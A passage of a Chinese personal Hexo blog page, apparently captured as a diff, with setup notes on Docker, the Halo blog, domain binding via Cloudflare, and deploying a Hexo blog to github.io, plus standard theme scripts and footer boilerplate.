+<p><img src="/2023/07/20/%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%82%B9/1665632561044.png" alt="1665632561044"></p>
+<p><img src="/2023/07/20/%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%82%B9/1656426236040.png" alt="1656426236040"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">安装docker</span><br><span class="line">	https://docs.docker.com/engine/install/centos/</span><br><span class="line">	</span><br><span class="line">yum update    #可以不升级</span><br><span class="line">#设置资源</span><br><span class="line">yum install -y yum-utils</span><br><span class="line">yum-config-manager \</span><br><span class="line">    --add-repo \</span><br><span class="line">    https://download.docker.com/linux/centos/docker-ce.repo</span><br><span class="line">#安装docker引擎</span><br><span class="line">systemctl start docker			#启动一下</span><br><span class="line">docker run hello-world			</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">docker安装halo</span><br><span class="line">	https://docs.halo.run/getting-started/install/docker/</span><br><span class="line"></span><br><span class="line">mkdir ~/.halo &amp;&amp; cd ~/.halo			#管理元权限执行，pwd为/root/.halo</span><br><span class="line">wget https://dl.halo.run/config/application-template.yaml -O ./application.yaml</span><br><span class="line">vim application.yaml				#默认8090端口		默认H2database</span><br><span class="line">docker pull halohub/halo:1.5.3		#拉取最新的Halo镜像</span><br><span class="line">#创建容器</span><br><span class="line">docker run -it -d --name halo -p 8090:8090 -v ~/.halo:/root/.halo --restart=unless-stopped halohub/halo:1.5.3</span><br><span class="line">#此处按照博主的意思	这样改应该就可以开第二个博客在8091端口，要创建~/.halo2 此处applocation.yaml文件不用改 改文件夹加端口两个部分</span><br><span class="line">docker run -it -d --name halo2 -p 8091:8090 -v ~/.halo2:/root/.halo --restart=unless-stopped halohub/halo:1.5.3</span><br><span class="line">    -it： 开启输入功能并连接伪终端</span><br><span class="line">    -d： 后台运行容器</span><br><span class="line">    --name： 为容器指定一个名称</span><br><span class="line">    -p： 端口映射，格式为 主机(宿主)端口:容器端口 ，可在 application.yaml 配置。</span><br><span class="line">    -v： 工作目录映射。形式为：-v 宿主机路径:/root/.halo，后者不能修改。</span><br><span class="line">    --restart： 建议设置为 unless-stopped，在 Docker 启动的时候自动启动 Halo 容器</span><br><span class="line">docker会自启动两个博客</span><br><span class="line">systemctl enable docker		把docker加入自启动</span><br><span class="line"></span><br><span class="line">8090端口放行</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">绑定域名</span><br><span class="line"></span><br><span class="line">#可参考视频</span><br><span class="line">https://www.bilibili.com/video/BV1Dq4y1Z7q5?from=search&amp;seid=11693727023437818175&amp;spm_id_from=333.337.0.0&amp;vd_source=d5448e640adeda715972607248810967</span><br><span class="line">#这个网站要注册购买域名</span><br><span class="line">https://www.namesilo.com</span><br><span class="line">#使用cloudflare关联域名和ip地址，也是先注册账号</span><br><span class="line">https://developers.cloudflare.com</span><br><span class="line">#按步骤来，第三步关联（链接1），将cloudflare分配的名称服务器（链接2）关联到namaslio（链接3）</span><br><span class="line">https://developers.cloudflare.com/dns/zone-setups/full-setup/setup/</span><br><span class="line">https://dash.cloudflare.com/14c08eb2e4e0d81cdcd74e2bef1566f1/jinjidehyy.com/dns</span><br><span class="line">https://www.namesilo.com/account_domain_manage_domain.php?domain=ZmRmZwZlZmRmAQZ2ZmNmBD==5n3r9p122761r85091ors8o52rn69noq</span><br><span class="line">#多地ping查看是否绑定成功</span><br><span class="line">https://ping.chinaz.com/www.jinjidehyy.com</span><br><span class="line"></span><br><span class="line"># p8绑定域名p9反向代理没看完 网站需要备案在申请 暂不能用域名访问 还有SSL</span><br><span class="line"> [如何用服务器优雅地搭建一个博客—Hello,Halo!_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1JN411Q7Na/?spm_id_from=333.337.search-card.all.click&amp;vd_source=d5448e640adeda715972607248810967) </span><br></pre></td></tr></table></figure>
+
+<h3 id="ctfshow"><a href="#ctfshow" class="headerlink" title="ctfshow"></a>ctfshow</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">web136</span><br><span class="line">	tee 读取标准输入内容，将读取到的数据写到标准输出和文件</span><br><span class="line"></span><br><span class="line">intval	获取变量证书值 转化字符 到第一个非数字的字符</span><br></pre></td></tr></table></figure>
+
+<h3 id="github-io建博客"><a href="#github-io建博客" class="headerlink" title="github.io建博客"></a>github.io建博客</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">开始的操作参考</span><br><span class="line">	https://blog.csdn.net/qq_40871466/article/details/86763540</span><br><span class="line">	https://zhuanlan.zhihu.com/p/105715224</span><br><span class="line">        node.js</span><br><span class="line">        git工具</span><br><span class="line">        GitHub建立仓库 起名字</span><br><span class="line">        npm install -g hexo-cli </span><br><span class="line">		hexo init</span><br><span class="line">		npm install</span><br><span class="line"></span><br><span class="line">本地部署命令</span><br><span class="line">	hexo new &quot;md文件名&quot;  #可创建md文件及其zi&#x27;yuan</span><br><span class="line">	hexo clean			#删除public文件夹内容</span><br><span class="line">	hexo g				#根据/source/_post文件夹内容在public生成html和对应图片资源文件</span><br><span class="line">	hexo s				#本地3000端口开启服务</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">settings中danger zones可以删除仓库</span><br><span class="line"></span><br><span class="line">下载慢设置全局Config代理。</span><br><span class="line">git config --global http.proxy http://127.0.0.1:7890</span><br><span class="line">git config --global https.proxy http://127.0.0.1:7890</span><br><span class="line"></span><br><span class="line">_config.yml文件配置		分支是可以改的</span><br><span class="line">	deploy:</span><br><span class="line">      type: git</span><br><span class="line">      repository: git@github.com:huyaoyao2019/huyaoyao2019.github.io.git  #你的仓库地址</span><br><span class="line">      branch: master</span><br><span class="line">github.io部署</span><br><span class="line">	ssh密钥</span><br><span class="line">        cd ~/.ssh</span><br><span class="line">    	ssh-keygen -t rsa -C &quot;1228876399@qq.com&quot;</span><br><span class="line">    	id_rsa.pub粘到到settings的SSH and GPG keys的new SSH key</span><br><span class="line">   	执行hexo d 会上传(调用hexo-asset-image(要安装))博客</span><br><span class="line">   		输密码 ******</span><br><span class="line">    settings中Emails取消勾选 Keep my email address private</span><br><span class="line">        hexo d 执行不了报错不能邮箱推送</span><br><span class="line">    图片目录报错 修改hexo-asset-image index.js 2处 拼拼凑凑弄出来的</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/20/%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%82%B9/1688573272225.png" alt="1688573272225"></p>
+<p><img src="/2023/07/20/%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%82%B9/1688573287005.png" alt="1688573287005"></p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">John Doe</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://huyaoyao2019.github.io/2023/07/20/%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%82%B9/">http://huyaoyao2019.github.io/2023/07/20/%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%82%B9/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">John Doe</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2023/07/20/upload-labs/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="upload-labs">
+                        
+                        <span class="card-title">upload-labs</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-07-20
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            John Doe
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="java代码审计">
+                        
+                        <span class="card-title">java代码审计</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-07-20
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            John Doe
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="/libs/aplayer/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2023</span>
+            
+            <a href="/about" target="_blank">John Doe</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            
+            <br>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/blinkfox" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1181062873@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+    
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
